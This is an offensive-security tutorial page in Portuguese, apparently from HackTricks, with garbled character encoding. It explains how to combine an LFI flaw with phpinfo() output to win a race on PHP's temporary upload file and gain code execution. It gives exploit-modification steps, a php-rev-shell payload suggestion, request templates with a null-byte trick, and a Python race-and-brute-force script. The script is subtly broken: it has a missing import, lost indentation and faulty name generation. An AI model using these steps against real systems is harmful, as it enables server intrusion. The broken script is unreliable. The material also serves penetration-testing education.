<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>


Para explorar essa vulnerabilidade voc√™ precisa: **Uma vulnerabilidade LFI, uma p√°gina onde phpinfo() √© exibido, "file\_uploads = on" e o servidor tem que ser capaz de escrever no diret√≥rio "/tmp".**

[https://www.insomniasec.com/downloads/publications/phpinfolfi.py](https://www.insomniasec.com/downloads/publications/phpinfolfi.py)

**Tutorial HTB**: [https://www.youtube.com/watch?v=rs4zEwONzzk\&t=600s](https://www.youtube.com/watch?v=rs4zEwONzzk\&t=600s)

Voc√™ precisa corrigir o exploit (trocar **=>** por **=>**). Para fazer isso voc√™ pode:
```
sed -i 's/\[tmp_name\] \=>/\[tmp_name\] =\&gt/g' phpinfolfi.py
```
Voc√™ precisa alterar tamb√©m o **payload** no in√≠cio do exploit (para um php-rev-shell, por exemplo), o **REQ1** (isso deve apontar para a p√°gina phpinfo e deve incluir o preenchimento, ou seja: _REQ1="""POST /install.php?mode=phpinfo\&a="""+preenchimento+""" HTTP/1.1_), e **LFIREQ** (isso deve apontar para a vulnerabilidade de LFI, ou seja: _LFIREQ="""GET /info?page=%s%%00 HTTP/1.1\r --_ Verifique o duplo "%" ao explorar o caractere nulo)

{% file src="../../.gitbook/assets/LFI-With-PHPInfo-Assistance.pdf" %}

### Teoria

Se os uploads s√£o permitidos no PHP e voc√™ tentar fazer upload de um arquivo, esse arquivo √© armazenado em um diret√≥rio tempor√°rio at√© que o servidor tenha terminado de processar a solicita√ß√£o, ent√£o esse arquivo tempor√°rio √© exclu√≠do.

Ent√£o, se voc√™ encontrou uma vulnerabilidade de LFI no servidor web, voc√™ pode tentar adivinhar o nome do arquivo tempor√°rio criado e explorar um RCE acessando o arquivo tempor√°rio antes que ele seja exclu√≠do.

No **Windows**, os arquivos geralmente s√£o armazenados em **C:\Windows\temp\php**

No **Linux**, o nome do arquivo costuma ser **aleat√≥rio** e localizado em **/tmp**. Como o nome √© aleat√≥rio, √© necess√°rio **extrair de algum lugar o nome do arquivo tempor√°rio** e acess√°-lo antes que seja exclu√≠do. Isso pode ser feito lendo o valor da **vari√°vel $\_FILES** dentro do conte√∫do da fun√ß√£o "**phpconfig()**".

**phpinfo()**

O **PHP** usa um buffer de **4096B** e quando est√° **cheio**, √© **enviado para o cliente**. Ent√£o o cliente pode **enviar** **muitas solicita√ß√µes grandes** (usando cabe√ßalhos grandes) **fazendo upload de um php** reverse **shell**, aguardar o **retorno da primeira parte do phpinfo()** (onde est√° o nome do arquivo tempor√°rio) e tentar **acessar o arquivo tempor√°rio** antes que o servidor PHP exclua o arquivo explorando uma vulnerabilidade de LFI.

**Script Python para tentar for√ßar o nome (se o comprimento for 6)**
```python
import itertools
import requests
import sys

print('[+] Trying to win the race')
f = {'file': open('shell.php', 'rb')}
for _ in range(4096 * 4096):
requests.post('http://target.com/index.php?c=index.php', f)


print('[+] Bruteforcing the inclusion')
for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
url = 'http://target.com/index.php?c=/tmp/php' + fname
r = requests.get(url)
if 'load average' in r.text:  # <?php echo system('uptime');
print('[+] We have got a shell: ' + url)
sys.exit(0)

print('[x] Something went wrong, please try again')
```
<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
